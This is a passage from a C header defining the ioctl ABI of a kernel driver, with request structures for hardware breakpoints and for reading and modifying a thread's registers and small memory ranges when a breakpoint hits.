    nbdriver_u64 pc, sp, pstate, x[31];
};
struct nbdriver_hwbp_request {
    nbdriver_u32 version, size, operation, flags;
    nbdriver_s32 pid, tid;
    nbdriver_u64 expected_start_ns, expected_thread_start_ns;
    nbdriver_u64 handle, address;
    nbdriver_u32 type, length;
    nbdriver_u64 records, after_sequence, hits, dropped, switch_missed;
    nbdriver_u32 capacity, count, exec_slots, watch_slots;
    nbdriver_s32 error;
    nbdriver_u32 reserved;
};
#define NBDRIVER_IOC_HWBP \
    _IOWR(NBDRIVER_IOC_MAGIC, 0x2e, struct nbdriver_hwbp_request)

/* Generic bounded register rendezvous. No target offsets or domain math.
 * Add an execution HWBP with HWBP_CONTEXT. NEXT delivers exact GP/FPSIMD
 * registers in task context. REPLY changes selected registers and small memory
 * ranges. Timeout/cancel leaves original state; no automatic PC skipping. */
#define NBDRIVER_HWBP_CONTEXT (1U << 4)
#define NBDRIVER_CONTEXT_VERSION 1U
#define NBDRIVER_CONTEXT_INFO 0U
#define NBDRIVER_CONTEXT_NEXT 1U
#define NBDRIVER_CONTEXT_REPLY 2U
#define NBDRIVER_CONTEXT_OUTCOME 3U
#define NBDRIVER_CONTEXT_AVAILABLE (1U << 0)
#define NBDRIVER_CONTEXT_FP (1U << 1)
#define NBDRIVER_CONTEXT_APPLY (1U << 2)
#define NBDRIVER_CONTEXT_REARM (1U << 3)
#define NBDRIVER_CONTEXT_COMMITTED (1U << 4)
#define NBDRIVER_CONTEXT_SP (1ULL << 31)
#define NBDRIVER_CONTEXT_PC (1ULL << 32)
struct nbdriver_context_registers {
    nbdriver_u64 x[31], sp, pc, v[32][2];
};
struct nbdriver_context_memory {
    nbdriver_u64 address;
    nbdriver_u32 size, reserved;
    unsigned char bytes[16];
};
struct nbdriver_context_request {
    nbdriver_u32 version, size, operation, flags;
    nbdriver_u64 handle, event, deadline_ns;
    nbdriver_s32 pid, tid;
    nbdriver_u64 gp_mask;
    nbdriver_u32 fp_mask, memory_count;
    struct nbdriver_context_registers regs;
    struct nbdriver_context_memory memory[2];
    nbdriver_s32 error;
    nbdriver_u32 reserved;
};
#define NBDRIVER_IOC_CONTEXT _IOWR(NBDRIVER_IOC_MAGIC, 0x2f, struct nbdriver_context_request)

#endif /* NBDRIVER_ABI_H */
